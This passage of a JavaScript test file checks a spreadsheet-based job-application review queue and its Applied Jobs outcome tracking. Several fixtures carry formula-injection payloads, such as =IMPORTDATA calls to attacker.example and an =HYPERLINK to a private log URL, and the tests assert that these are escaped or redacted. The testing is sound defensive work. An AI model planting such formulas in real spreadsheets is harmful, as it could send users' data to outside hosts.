  assert.deepEqual(forged.active_updates, []);
  assert.match(forged.invalid_actions[0].error, /unsupported Applied Jobs/);

  const diagnosticSafe = processReviewActions(
    [],
    [],
    schema,
    now,
    {
      executionId: "applied-sanitized-diagnostic",
      reviewConfig: view,
      appliedJobsRows: [
        {
          row_number: 99,
          Action: "Offer",
          canonical_job_id:
            "=token=do-not-log https://attacker.example/private",
          source_state_guard: "forged"
        }
      ]
    }
  );
  assert.equal(diagnosticSafe.invalid_actions.length, 1);
  assert.doesNotMatch(
    diagnosticSafe.invalid_actions[0].canonical_job_id,
    /do-not-log|attacker\.example/
  );
  assert.match(
    diagnosticSafe.invalid_actions[0].canonical_job_id,
    /token=\[redacted\] \[url\]/
  );

  const nonApplied = {
    ...applied,
    pipeline_status: "skipped",
    application_decision: "skipped"
  };
  nonApplied.state_guard = stateGuard(nonApplied);
  const invalidDecision = processReviewActions(
    [nonApplied],
    [],
    schema,
    now,
    {
      executionId: "applied-invalid-decision",
      reviewConfig: view,
      appliedJobsRows: [
        {
          ...action("Offer", nonApplied.state_guard),
          canonical_job_id: nonApplied.canonical_job_id
        }
      ]
    }
  );
  assert.deepEqual(invalidDecision.active_updates, []);
  assert.match(
    invalidDecision.invalid_actions[0].error,
    /outcomes require an applied decision/
  );

  const malformed = { ...applied, outcome_events: "not-json" };
  malformed.state_guard = stateGuard(malformed);
  const malformedResult = processReviewActions(
    [malformed],
    [],
    schema,
    now,
    {
      executionId: "applied-malformed",
      reviewConfig: view,
      appliedJobsRows: [
        {
          ...action("Interview", malformed.state_guard),
          canonical_job_id: malformed.canonical_job_id
        }
      ]
    }
  );
  assert.deepEqual(malformedResult.active_updates, []);
  assert.match(
    malformedResult.invalid_actions[0].error,
    /outcome history is malformed/
  );

  const duplicate = processReviewActions(
    [applied, { ...applied, row_number: 72 }],
    [],
    schema,
    now,
    {
      executionId: "applied-duplicate",
      reviewConfig: view,
      appliedJobsRows: [action("Rejected")]
    }
  );
  assert.deepEqual(duplicate.active_updates, []);
  assert.match(duplicate.invalid_actions[0].error, /duplicate source/);

  const duplicateProjection = processReviewActions(
    [applied],
    [],
    schema,
    now,
    {
      executionId: "applied-duplicate-projection",
      reviewConfig: view,
      appliedJobsRows: [
        { ...action(""), row_number: 2 },
        { ...action("Offer"), row_number: 3 }
      ]
    }
  );
  assert.deepEqual(duplicateProjection.active_updates, []);
  assert.match(
    duplicateProjection.invalid_actions[0].error,
    /duplicate projection identity/
  );
});

test("Applied Jobs outcome actions are explicit, append-safe, and idempotent", () => {
  const repliedAt = "2026-07-28T08:00:00.000Z";
  const replied = job({
    row_number: 81,
    source_job_id: "applied-idempotent",
    canonical_job_id: "onlinejobs.ph:applied-idempotent",
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    outcome: "replied",
    outcome_at: repliedAt,
    outcome_events: [
      { id: "reply-1", type: "replied", at: repliedAt }
    ]
  });
  replied.state_guard = stateGuard(replied);
  const run = (record, Action, executionId) =>
    processReviewActions([], [record], schema, now, {
      executionId,
      reviewConfig: view,
      appliedJobsRows: [
        {
          row_number: 12,
          Action,
          canonical_job_id: record.canonical_job_id,
          source_state_guard: record.state_guard
        }
      ]
    });

  const duplicate = run(replied, "Replied", "applied-repeat");
  assert.equal(duplicate.archive_updates[0].outcome, "replied");
  assert.equal(duplicate.archive_updates[0].outcome_at, repliedAt);
  assert.equal(duplicate.archive_updates[0].outcome_events.length, 1);

  const cleared = run(replied, "Clear Outcome", "applied-clear");
  assert.equal(cleared.archive_updates[0].outcome, "");
  assert.deepEqual(
    cleared.archive_updates[0].outcome_events.map((event) => event.type),
    ["replied", "correction"]
  );

  const blank = {
    ...replied,
    outcome: "",
    outcome_at: "",
    outcome_events: []
  };
  blank.state_guard = stateGuard(blank);
  const clearedBlank = run(blank, "Clear Outcome", "applied-clear-blank");
  assert.equal(clearedBlank.archive_updates[0].outcome, "");
  assert.deepEqual(clearedBlank.archive_updates[0].outcome_events, []);

  const noResponse = run(blank, "No Response", "applied-no-response");
  assert.equal(noResponse.archive_updates[0].outcome, "no_response");
  assert.deepEqual(
    noResponse.archive_updates[0].outcome_events.map((event) => event.type),
    ["no_response"]
  );

  const rejected = run(blank, "Rejected", "applied-rejected");
  assert.equal(rejected.archive_updates[0].outcome, "rejected");
  assert.deepEqual(
    rejected.archive_updates[0].outcome_events.map((event) => event.type),
    ["rejected"]
  );
  assert.equal(
    rejected.archive_updates[0].canonical_job_id,
    blank.canonical_job_id
  );
  assert.equal(
    rejected.archive_updates[0].application_decision,
    blank.application_decision
  );
  assert.equal(
    rejected.archive_updates[0].application_decided_at,
    blank.application_decided_at
  );
  assert.equal(
    rejected.archive_updates[0].application_snapshot_at,
    blank.application_snapshot_at
  );
  assert.equal(
    rejected.archive_updates[0].generated_message,
    blank.generated_message
  );
  assert.equal(
    rejected.archive_updates[0].archived_at,
    blank.archived_at
  );
  assert.equal(
    buildAppliedJobsProjection([], [blank], schema, view, now).rows[0][
      "Current outcome"
    ],
    ""
  );
});

test("priority queue orders ready and high-match jobs before review and recovery", () => {
  const rows = [
    job({ source_job_id: "6101", canonical_job_id: "onlinejobs.ph:6101", pipeline_status: "review_required", match_score: 50 }),
    job({ source_job_id: "6102", canonical_job_id: "onlinejobs.ph:6102", pipeline_status: "ready", match_score: 60 }),
    job({ source_job_id: "6103", canonical_job_id: "onlinejobs.ph:6103", pipeline_status: "recommended", match_score: 90 }),
    job({ source_job_id: "6104", canonical_job_id: "onlinejobs.ph:6104", pipeline_status: "retryable_error", match_score: 95 })
  ];
  const queue = buildReviewQueue(rows, schema, now);
  assert.deepEqual(queue.map((record) => record.pipeline_status), [
    "ready",
    "recommended",
    "review_required",
    "retryable_error"
  ]);
});

test("priority queue uses opportunity score within lifecycle state and deterministic fallback", () => {
  const rows = [
    job({
      source_job_id: "6111",
      canonical_job_id: "onlinejobs.ph:6111",
      pipeline_status: "recommended",
      opportunity_score: 70,
      match_score: 10,
      ranking_confidence: "medium",
      posted_at: "2026-07-28T08:00:00.000Z"
    }),
    job({
      source_job_id: "6112",
      canonical_job_id: "onlinejobs.ph:6112",
      pipeline_status: "recommended",
      opportunity_score: 60,
      match_score: 99,
      ranking_confidence: "high",
      posted_at: "2026-07-28T09:00:00.000Z"
    }),
    job({
      source_job_id: "6113",
      canonical_job_id: "onlinejobs.ph:6113",
      pipeline_status: "recommended",
      opportunity_score: "",
      match_score: 65,
      posted_at: "2026-07-28T10:00:00.000Z"
    }),
    job({
      source_job_id: "6115",
      canonical_job_id: "onlinejobs.ph:6115",
      pipeline_status: "recommended",
      opportunity_score: 60,
      match_score: 1,
      ranking_confidence: "high",
      posted_at: "2026-07-28T09:00:00.000Z"
    }),
    job({
      source_job_id: "6114",
      canonical_job_id: "onlinejobs.ph:6114",
      pipeline_status: "recommended",
      opportunity_score: 60,
      match_score: 1,
      ranking_confidence: "high",
      posted_at: "2026-07-28T09:00:00.000Z"
    })
  ];
  assert.deepEqual(
    buildReviewQueue(rows, schema, now).map((record) => record.canonical_job_id),
    [
      "onlinejobs.ph:6111",
      "onlinejobs.ph:6113",
      "onlinejobs.ph:6112",
      "onlinejobs.ph:6114",
      "onlinejobs.ph:6115"
    ]
  );
});

test("simplified queue projects exact review fields, reasons, eligibility, and legacy scores", () => {
  const reviewRequired = job({
    source_job_id: "6121",
    canonical_job_id: "onlinejobs.ph:6121",
    pipeline_status: "review_required",
    opportunity_score: 55,
    requirement_gap_details: [
      { requirement: "Confirm Kubernetes depth", classification: "ambiguous" }
    ],
    application_warnings: ["Verify required availability"]
  });
  const ready = job({
    source_job_id: "6122",
    canonical_job_id: "onlinejobs.ph:6122",
    opportunity_score: 80
  });
  const legacy = job({
    source_job_id: "6123",
    canonical_job_id: "onlinejobs.ph:6123",
    pipeline_status: "recommended",
    opportunity_score: "",
    match_score: 64
  });
  const excluded = [
    job({
      source_job_id: "6124",
      canonical_job_id: "onlinejobs.ph:6124",
      pipeline_status: "retryable_error"
    }),
    job({
      source_job_id: "6125",
      canonical_job_id: "onlinejobs.ph:6125",
      pipeline_status: "applied",
      application_decision: "applied"
    })
  ];
  const projection = buildReviewQueueProjection(
    [reviewRequired, ready, legacy, ...excluded],
    schema,
    view,
    now
  );
  assert.deepEqual(
    projection.rows.map((row) => row.canonical_job_id),
    [
      "onlinejobs.ph:6122",
      "onlinejobs.ph:6123",
      "onlinejobs.ph:6121"
    ]
  );
  assert.deepEqual(Object.keys(projection.rows[0]), view.review_queue.fields);
  assert.equal(projection.rows[0].Score, 80);
  assert.equal(projection.rows[1].Score, 64);
  assert.equal(projection.rows[0].Action, "");
  assert.equal(
    projection.rows[0].source_state_guard,
    stateGuard(ready)
  );
  assert.match(
    projection.rows[2]["Reason for review"],
    /Verify required availability/
  );
  assert.match(
    projection.rows[2]["Reason for review"],
    /Confirm Kubernetes depth/
  );
  assert.equal(projection.invalid_records.length, 0);

  const formulaLike = buildReviewQueueProjection(
    [
      job({
        source_job_id: "6126",
        canonical_job_id: "onlinejobs.ph:6126",
        job_title: "=IMPORTDATA(\"https://attacker.example/title\")",
        company: "+malicious",
        generated_message: "@malicious"
      })
    ],
    schema,
    view,
    now
  ).rows[0];
  assert.match(formulaLike["Job title"], /^'=/);
  assert.match(formulaLike.Company, /^'\+/);
  assert.match(formulaLike["Generated message"], /^'@/);

  assert.equal(
    reasonForReview(
      job({
        pipeline_status: "review_required",
        match_reasons: [],
        requirement_gaps: [],
        requirement_gap_details: [],
        application_warnings: []
      }),
      view
    ),
    "Review required; no review reason was recorded."
  );
  assert.match(
    reasonForReview(
      job({
        pipeline_status: "review_required",
        application_warnings: ["=IMPORTDATA(\"https://attacker.example\")"]
      }),
      view
    ),
    /Warnings: '=IMPORTDATA/
  );
});

test("generation failures stay visible with bounded friendly recovery context", () => {
  const retryable = job({
    source_job_id: "6127",
    canonical_job_id: "onlinejobs.ph:6127",
    company: "Example Co",
    pipeline_status: "retryable_error",
    failed_stage: "generation",
    attempt_count: 2,
    next_retry_at: "2026-07-28T10:05:00.000Z",
    error_category: "processing_failure",
    error_summary:
      "message_validation: message exceeds 300 words; unsupported skill: Expo; token=private",
    generated_message: "Rejected draft must not be projected"
  });
  const terminal = job({
    source_job_id: "6128",
    canonical_job_id: "onlinejobs.ph:6128",
    pipeline_status: "terminal_error",
    failed_stage: "generation",
    attempt_count: 3,
    next_retry_at: "",
    error_category: "timeout",
    error_summary:
      "=HYPERLINK(\"https://example.invalid/private/provider-log\", \"provider timeout\")",
    generated_message: ""
  });
  const unrelatedTerminal = job({
    source_job_id: "6129",
    canonical_job_id: "onlinejobs.ph:6129",
    pipeline_status: "terminal_error",
    failed_stage: "evaluation",
    error_summary: "Evaluation failed"
  });

  const projection = buildReviewQueueProjection(
    [retryable, terminal, unrelatedTerminal],
    schema,
    view,
    now
  );
  assert.deepEqual(
    projection.rows.map((row) => row.canonical_job_id),
    ["onlinejobs.ph:6127", "onlinejobs.ph:6128"]
  );
  const retryableRow = projection.rows[0];
  assert.equal(retryableRow.Status, "retryable_error");
  assert.equal(retryableRow["Job title"], retryable.job_title);
  assert.equal(retryableRow.Company, "Example Co");
  assert.equal(retryableRow.Score, retryable.opportunity_score);
  assert.equal(retryableRow["Job link"], retryable.canonical_url);
  assert.equal(retryableRow["Generated message"], "");
  assert.match(
    retryableRow["Reason for review"],
    /Automatic retry is pending/
  );
  assert.match(
    retryableRow["Reason for review"],
    /message exceeds 300 words; unsupported skill: Expo/
  );
  assert.doesNotMatch(retryableRow["Reason for review"], /private/);

  const terminalRow = projection.rows[1];
  assert.match(
    terminalRow["Reason for review"],
    /attempts are exhausted after 3 attempts/
  );
  assert.match(
    terminalRow["Reason for review"],
    /Generate Application to retry or Skip/
  );
  assert.doesNotMatch(
    terminalRow["Reason for review"],
    /example\.invalid|private\/provider-log/
  );
  assert.ok(
    terminalRow["Reason for review"].length <=
      view.review_queue.reason_maximum_length
  );
  assert.equal(projection.invalid_records.length, 0);

  const due = reasonForReview(
    { ...retryable, next_retry_at: "2026-07-28T09:55:00.000Z" },
    view,
    now
  );
  assert.match(due, /Automatic retry is due/);

  const packNotReady = reasonForReview(
    {
      ...terminal,
      error_category: "processing_failure",
      error_summary:
        "Invalid application pack: application_pack_status must be ready"
    },
    view,
    now
  );
  assert.match(
    packNotReady,
    /application pack needs attention before generation/
  );
  assert.doesNotMatch(packNotReady, /application_pack_status/);
});

test("simplified queue excludes ambiguous source identities instead of projecting duplicates", () => {
  const duplicate = job({
    source_job_id: "6131",
    canonical_job_id: "onlinejobs.ph:6131",
    pipeline_status: "ready"
  });
  const projection = buildReviewQueueProjection(
    [
      duplicate,
      { ...duplicate, row_number: 9, job_title: "Conflicting duplicate" },
      job({
        source: "",
        source_job_id: "",
        canonical_job_id: "",
        canonical_url: "",
        job_title: "Missing identity",
        pipeline_status: "review_required"
      })
    ],
    schema,
    view,
    now
  );
  assert.deepEqual(projection.rows, []);
  assert.deepEqual(
    projection.invalid_records.map((entry) => entry.error).sort(),
    [
      "eligible review record has duplicate canonical identity",
      "eligible review record has duplicate canonical identity",
      "eligible review record is missing canonical identity"
    ]
  );
});

test("friendly queue actions reuse guarded manual transitions by canonical identity", () => {
  const cases = [
    ["Generate Application", "review_required", "recommended"],
    ["I Applied", "ready", "applied"],
    ["Skip", "ready", "skipped"]
  ];
  for (const [label, initialStatus, expectedStatus] of cases) {
    const source = job({
      row_number: 42,
      source_job_id: `620-${label.length}`,
      canonical_job_id: `onlinejobs.ph:620-${label.length}`,
      pipeline_status: initialStatus
    });
    source.state_guard = stateGuard(source);
    const processed = processReviewActions(
      [source],
      [],
      schema,
      now,
      {
        executionId: "review-execution-1",
        reviewConfig: view,
        queueRows: [
          {
            row_number: 99,
            Action: label,
            canonical_job_id: source.canonical_job_id,
            source_state_guard: source.state_guard
          }
        ]
      }
    );
    assert.equal(processed.active_claims.length, 1);
    assert.equal(processed.active_claims[0].state_guard, source.state_guard);
    assert.match(
      processed.active_claims[0].processing_commit_guard,
      /^commit:review:/
    );
    assert.equal(processed.active_updates.length, 1);
    assert.equal(processed.active_updates[0].row_number, 42);
    assert.equal(processed.active_updates[0].pipeline_status, expectedStatus);
    assert.equal(processed.active_updates[0].manual_action, "");
    assert.equal(processed.processed_queue_actions.length, 1);
    assert.deepEqual(processed.invalid_actions, []);
  }
});

test("recovery actions retry or skip generation failures while apply fails closed", () => {
  for (const initialStatus of ["retryable_error", "terminal_error"]) {
    const source = job({
      row_number: initialStatus === "retryable_error" ? 51 : 52,
      source_job_id: `recovery-${initialStatus}`,
      canonical_job_id: `onlinejobs.ph:recovery-${initialStatus}`,
      pipeline_status: initialStatus,
      failed_stage: "generation",
      attempt_count: 3,
      next_retry_at: "",
      error_category: "processing_failure",
      error_summary: "message_validation: unsupported skill: Expo",
      generated_message: ""
    });
    source.state_guard = stateGuard(source);
    const retried = processReviewActions(
      [source],
      [],
      schema,
      now,
      {
        executionId: `recovery-${initialStatus}`,
        reviewConfig: view,
        queueRows: [
          {
            row_number: 8,
            Action: "Generate Application",
            canonical_job_id: source.canonical_job_id,
            source_state_guard: source.state_guard
          }
        ]
      }
    );
    assert.deepEqual(retried.invalid_actions, []);
    assert.equal(retried.active_updates.length, 1);
    assert.equal(
      retried.active_updates[0].pipeline_status,
      "retryable_error"
    );
    assert.equal(retried.active_updates[0].attempt_count, 0);
    assert.equal(retried.active_updates[0].next_retry_at, now);
    assert.equal(retried.active_updates[0].failed_stage, "generation");
    assert.equal(
      retried.processed_queue_actions[0].manual_action,
      "retry"
    );
  }

  const failure = job({
    source_job_id: "recovery-skip",
    canonical_job_id: "onlinejobs.ph:recovery-skip",
    pipeline_status: "terminal_error",
    failed_stage: "generation",
    attempt_count: 3,
    generated_message: ""
  });
  failure.state_guard = stateGuard(failure);
  const skipped = processReviewActions(
    [failure],
    [],
    schema,
    now,
    {
      executionId: "recovery-skip",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 9,
          Action: "Skip",
          canonical_job_id: failure.canonical_job_id,
          source_state_guard: failure.state_guard
        }
      ]
    }
  );
  assert.deepEqual(skipped.invalid_actions, []);
  assert.equal(skipped.active_updates[0].pipeline_status, "skipped");
  assert.equal(
    skipped.active_updates[0].application_decision,
    "skipped"
  );
  const firstDecisionAt =
    skipped.active_updates[0].application_decided_at;
  const replay = applyManualAction(
    {
      ...skipped.active_updates[0],
      manual_action: "mark_skipped"
    },
    schema,
    "2026-07-28T11:00:00.000Z"
  );
  assert.equal(replay.valid, true);
  assert.equal(replay.record.application_decided_at, firstDecisionAt);

  const forgedApply = processReviewActions(
    [failure],
    [],
    schema,
    now,
    {
      executionId: "recovery-forged-apply",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 10,
          Action: "I Applied",
          canonical_job_id: failure.canonical_job_id,
          source_state_guard: failure.state_guard
        }
      ]
    }
  );
  assert.deepEqual(forgedApply.active_updates, []);
  assert.equal(forgedApply.invalid_actions.length, 1);
  assert.match(
    forgedApply.invalid_actions[0].error,
    /unavailable until a current validated message is ready/
  );
  assert.equal(failure.application_decision, "");

  const directForgedApply = applyManualAction(
    { ...failure, manual_action: "mark_applied" },
    schema,
    now
  );
  assert.equal(directForgedApply.valid, false);
  assert.equal(directForgedApply.record.pipeline_status, "terminal_error");
  assert.equal(directForgedApply.record.application_decision, "");
});

test("a successful retry returns the same canonical job as ready with its validated message", () => {
  const recovered = job({
    source_job_id: "recovery-ready",
    canonical_job_id: "onlinejobs.ph:recovery-ready",
    pipeline_status: "ready",
    failed_stage: "",
    error_category: "",
    error_summary: "",
    generated_message: "Validated repaired message"
  });
  const projection = buildReviewQueueProjection(
    [recovered],
    schema,
    view,
    now
  );
  assert.equal(projection.rows.length, 1);
  assert.equal(
    projection.rows[0].canonical_job_id,
    recovered.canonical_job_id
  );
  assert.equal(projection.rows[0].Status, "ready");
  assert.equal(
    projection.rows[0]["Generated message"],
    "Validated repaired message"
  );
});

test("duplicate, stale, missing, and conflicting queue actions fail closed", () => {
  const source = job({
    source_job_id: "6141",
    canonical_job_id: "onlinejobs.ph:6141"
  });
  source.state_guard = stateGuard(source);
  const stale = processReviewActions(
    [source],
    [],
    schema,
    now,
    {
      executionId: "review-stale",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 3,
          Action: "I Applied",
          canonical_job_id: source.canonical_job_id,
          source_state_guard: "stale-guard"
        }
      ]
    }
  );
  assert.deepEqual(stale.active_updates, []);
  assert.match(stale.invalid_actions[0].error, /stale/);

  const conflicting = processReviewActions(
    [source],
    [],
    schema,
    now,
    {
      executionId: "review-conflict",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 3,
          Action: "I Applied",
          canonical_job_id: source.canonical_job_id,
          source_state_guard: source.state_guard
        },
        {
          row_number: 4,
          Action: "Skip",
          canonical_job_id: source.canonical_job_id,
          source_state_guard: source.state_guard
        }
      ]
    }
  );
  assert.deepEqual(conflicting.active_updates, []);
  assert.equal(conflicting.invalid_actions.length, 2);
  assert.ok(
    conflicting.invalid_actions.every((entry) =>
      /conflicting review queue actions/.test(entry.error)
    )
  );

  const missing = processReviewActions(
    [source],
    [],
    schema,
    now,
    {
      executionId: "review-missing",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 8,
          Action: "Skip",
          canonical_job_id: "onlinejobs.ph:missing",
          source_state_guard: source.state_guard
        }
      ]
    }
  );
  assert.deepEqual(missing.active_updates, []);
  assert.match(missing.invalid_actions[0].error, /source record is missing/);

  const duplicateSource = processReviewActions(
    [source, { ...source, row_number: 10 }],
    [],
    schema,
    now,
    {
      executionId: "review-duplicate-source",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 11,
          Action: "Skip",
          canonical_job_id: source.canonical_job_id,
          source_state_guard: source.state_guard
        }
      ]
    }
  );
  assert.deepEqual(duplicateSource.active_updates, []);
  assert.equal(duplicateSource.invalid_actions.length, 1);
  assert.match(duplicateSource.invalid_actions[0].error, /duplicate source/);
});

test("identical queue deliveries coalesce while a conflicting Sheet1 action wins", () => {
  const source = job({
    source_job_id: "6151",
    canonical_job_id: "onlinejobs.ph:6151"
  });
  source.state_guard = stateGuard(source);
  const duplicate = processReviewActions(
    [source],
    [],
    schema,
    now,
    {
      executionId: "review-duplicate-delivery",
      reviewConfig: view,
      queueRows: [3, 4].map((rowNumber) => ({
        row_number: rowNumber,
        Action: "I Applied",
        canonical_job_id: source.canonical_job_id,
        source_state_guard: source.state_guard
      }))
    }
  );
  assert.equal(duplicate.active_updates.length, 1);
  assert.equal(duplicate.processed_queue_actions[0].duplicate_count, 2);

  const directWins = processReviewActions(
    [{ ...source, manual_action: "mark_skipped" }],
    [],
    schema,
    now,
    {
      executionId: "review-direct-wins",
      reviewConfig: view,
      queueRows: [
        {
          row_number: 3,
          Action: "I Applied",
          canonical_job_id: source.canonical_job_id,
          source_state_guard: source.state_guard
        }
      ]
    }
  );
  assert.equal(directWins.active_updates.length, 1);
  assert.equal(directWins.active_updates[0].pipeline_status, "skipped");
  assert.equal(directWins.invalid_actions.length, 1);
  assert.match(directWins.invalid_actions[0].error, /conflicts with Sheet1/);
});

test("queue reconciliation removes completed rows, refreshes promotion, and protects new edits", () => {
  const ready = job({
    source_job_id: "6161",
    canonical_job_id: "onlinejobs.ph:6161"
  });
  ready.state_guard = stateGuard(ready);
  const recommended = job({
    source_job_id: "6162",
    canonical_job_id: "onlinejobs.ph:6162",
    pipeline_status: "recommended"
  });
  recommended.state_guard = stateGuard(recommended);
  const applied = {
    ...ready,
    pipeline_status: "applied",
    application_decision: "applied"
  };
  applied.state_guard = stateGuard(applied);
  const initialQueue = [
    {
      row_number: 2,
      Action: "I Applied",
      canonical_job_id: ready.canonical_job_id,
      source_state_guard: ready.state_guard
    },
    {
      row_number: 3,
      Action: "",
      canonical_job_id: recommended.canonical_job_id,
      source_state_guard: recommended.state_guard
    }
  ];
  const currentQueue = [
    initialQueue[0],
    {
      ...initialQueue[1],
      Action: "Skip"
    },
    {
      row_number: 7,
      Action: "",
      canonical_job_id: "onlinejobs.ph:stale",
      source_state_guard: "stale"
    }
  ];
  const reconciled = reconcileReviewQueue(
    [applied, recommended],
    currentQueue,
    initialQueue,
    schema,
    view,
    now
  );
  assert.deepEqual(reconciled.delete_rows, [
    { row_number: 7 },
    { row_number: 2 }
  ]);
  assert.equal(reconciled.protected_action_count, 1);
  assert.deepEqual(reconciled.queue_rows, []);

  const refreshed = reconcileReviewQueue(
    [recommended],
    [initialQueue[1]],
    [initialQueue[1]],
    schema,
    view,
    now
  );
  assert.deepEqual(refreshed.delete_rows, [{ row_number: 3 }]);
  assert.equal(refreshed.queue_rows.length, 1);
  assert.equal(refreshed.queue_rows[0].Status, "recommended");
  assert.equal(refreshed.queue_rows[0].Action, "");
});

test("queue reconciliation retains an action until its guarded source write is confirmed", () => {
  const ready = job({
    source_job_id: "6171",
    canonical_job_id: "onlinejobs.ph:6171"
  });
  ready.state_guard = stateGuard(ready);
  const pending = {
    row_number: 2,
    Action: "I Applied",
    canonical_job_id: ready.canonical_job_id,
    source_state_guard: ready.state_guard
  };
  const unconfirmed = reconcileReviewQueue(
    [ready],
    [pending],
    [pending],
    schema,
    view,
    now
  );
  assert.deepEqual(unconfirmed.delete_rows, []);
  assert.deepEqual(unconfirmed.queue_rows, []);
  assert.equal(unconfirmed.protected_action_count, 1);

  const committed = {
    ...ready,
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: now
  };
  committed.state_guard = stateGuard(committed);
  const cleanupRetry = reconcileReviewQueue(
    [committed],
    [pending],
    [pending],
    schema,
    view,
    now
  );
  assert.deepEqual(cleanupRetry.delete_rows, [{ row_number: 2 }]);
  assert.deepEqual(cleanupRetry.queue_rows, []);
  assert.equal(cleanupRetry.protected_action_count, 0);
});

test("Applied Jobs reconciliation preserves unconfirmed and concurrent actions", () => {
  const source = job({
    row_number: 91,
    source_job_id: "applied-reconcile",
    canonical_job_id: "onlinejobs.ph:applied-reconcile",
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    outcome: "",
    outcome_events: []
  });
  source.state_guard = stateGuard(source);
  const pending = {
    row_number: 2,
    Action: "Interview",
    canonical_job_id: source.canonical_job_id,
    source_state_guard: source.state_guard
  };
  const unconfirmed = reconcileAppliedJobs(
    [source],
    [],
    [pending],
    [pending],
    schema,
    view,
    now
  );
  assert.deepEqual(unconfirmed.clear_rows, []);
  assert.deepEqual(unconfirmed.applied_rows, []);
  assert.deepEqual(unconfirmed.rebase_rows, []);
  assert.equal(unconfirmed.protected_action_count, 1);

  const concurrent = {
    ...pending,
    row_number: 3,
    Action: "Offer"
  };
  const protectsLateEdit = reconcileAppliedJobs(
    [source],
    [],
    [concurrent],
    [{ ...pending, row_number: 2, Action: "" }],
    schema,
    view,
    now
  );
  assert.deepEqual(protectsLateEdit.clear_rows, []);
  assert.deepEqual(protectsLateEdit.applied_rows, []);
  assert.equal(protectsLateEdit.rebase_rows[0].Action, "Offer");
  assert.equal(protectsLateEdit.protected_action_count, 1);
});

test("Applied Jobs rebases a concurrent second action for the next guarded run", () => {
  const source = job({
    row_number: 96,
    source_job_id: "applied-second-action",
    canonical_job_id: "onlinejobs.ph:applied-second-action",
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    outcome: "",
    outcome_events: []
  });
  source.state_guard = stateGuard(source);
  const firstProjection = {
    row_number: 2,
    Action: "Offer",
    canonical_job_id: source.canonical_job_id,
    source_state_guard: source.state_guard
  };
  const first = processReviewActions(
    [source],
    [],
    schema,
    now,
    {
      executionId: "applied-first-action",
      reviewConfig: view,
      appliedJobsRows: [firstProjection]
    }
  );
  assert.equal(first.active_applied_updates[0].outcome, "offer");
  const committed = first.active_applied_updates[0];
  const secondProjection = {
    ...firstProjection,
    Action: "Rejected"
  };
  const reconciliation = reconcileAppliedJobs(
    [committed],
    [],
    [secondProjection],
    [firstProjection],
    schema,
    view,
    now
  );
  assert.deepEqual(reconciliation.clear_rows, []);
  assert.deepEqual(reconciliation.applied_rows, []);
  assert.equal(reconciliation.rebase_rows.length, 1);
  assert.equal(reconciliation.rebase_rows[0].Action, "Rejected");
  assert.equal(
    reconciliation.rebase_rows[0].source_state_guard,
    committed.state_guard
  );

  const second = processReviewActions(
    [committed],
    [],
    schema,
    "2026-07-29T13:00:00.000Z",
    {
      executionId: "applied-second-action",
      reviewConfig: view,
      appliedJobsRows: [reconciliation.rebase_rows[0]]
    }
  );
  assert.equal(second.invalid_actions.length, 0);
  assert.equal(second.active_applied_updates[0].outcome, "rejected");
  assert.deepEqual(
    second.active_applied_updates[0].outcome_events.map((event) => event.type),
    ["offer", "rejected"]
  );
});

test("Applied Jobs does not rebase an unchanged action across a direct outcome", () => {
  const source = job({
    row_number: 97,
    source_job_id: "applied-direct-rebase",
    canonical_job_id: "onlinejobs.ph:applied-direct-rebase",
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    outcome: "interview",
    outcome_at: "2026-07-28T08:00:00.000Z",
    outcome_events: [
      {
        id: "direct-rebase-interview",
        type: "interview",
        at: "2026-07-28T08:00:00.000Z"
      }
    ]
  });
  source.state_guard = stateGuard(source);
  const projected = {
    row_number: 2,
    Action: "Offer",
    canonical_job_id: source.canonical_job_id,
    source_state_guard: source.state_guard
  };
  const directRejected = applyManualAction(
    { ...source, manual_action: "outcome_rejected" },
    schema,
    now
  ).record;
  const reconciliation = reconcileAppliedJobs(
    [directRejected],
    [],
    [
      {
        ...projected,
        row_number: 3,
        source_state_guard: directRejected.state_guard
      }
    ],
    [projected],
    schema,
    view,
    now
  );
  assert.deepEqual(reconciliation.clear_rows, []);
  assert.deepEqual(reconciliation.rebase_rows, []);
  assert.equal(reconciliation.protected_action_count, 1);

  const retry = processReviewActions(
    [directRejected],
    [],
    schema,
    "2026-07-29T13:05:00.000Z",
    {
      executionId: "applied-direct-rebase-retry",
      reviewConfig: view,
      appliedJobsRows: [projected]
    }
  );
  assert.deepEqual(retry.active_updates, []);
  assert.match(retry.invalid_actions[0].error, /stale Applied Jobs action/);
  assert.equal(directRejected.outcome, "rejected");
});

test("Applied Jobs reconciliation refreshes confirmed actions and empty state", () => {
  const source = job({
    row_number: 101,
    source_job_id: "applied-refresh",
    canonical_job_id: "onlinejobs.ph:applied-refresh",
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    outcome: "",
    outcome_events: []
  });
  source.state_guard = stateGuard(source);
  const pending = {
    row_number: 2,
    Action: "Replied",
    canonical_job_id: source.canonical_job_id,
    source_state_guard: source.state_guard
  };
  const updated = {
    ...source,
    outcome: "replied",
    outcome_at: now,
    outcome_events: [{ id: "reply-1", type: "replied", at: now }],
    processing_commit_guard: "commit:review:confirmed"
  };
  updated.state_guard = stateGuard(updated);
  const refreshed = reconcileAppliedJobs(
    [],
    [updated],
    [pending],
    [pending],
    schema,
    view,
    now,
    {
      processedActions: [
        {
          canonical_job_id: source.canonical_job_id,
          manual_action: "outcome_replied",
          source_state_guard: source.state_guard,
          processing_commit_guard: "commit:review:confirmed"
        }
      ],
      confirmedCommitGuards: ["commit:review:confirmed"]
    }
  );
  assert.deepEqual(refreshed.clear_rows, []);
  assert.equal(refreshed.applied_rows.length, 1);
  assert.equal(refreshed.applied_rows[0]["Current outcome"], "replied");
  assert.equal(refreshed.applied_rows[0].Action, "");
  assert.equal(refreshed.protected_action_count, 0);

  const markerOnly = {
    ...source,
    processing_commit_guard: "commit:review:not-confirmed"
  };
  markerOnly.state_guard = stateGuard(markerOnly);
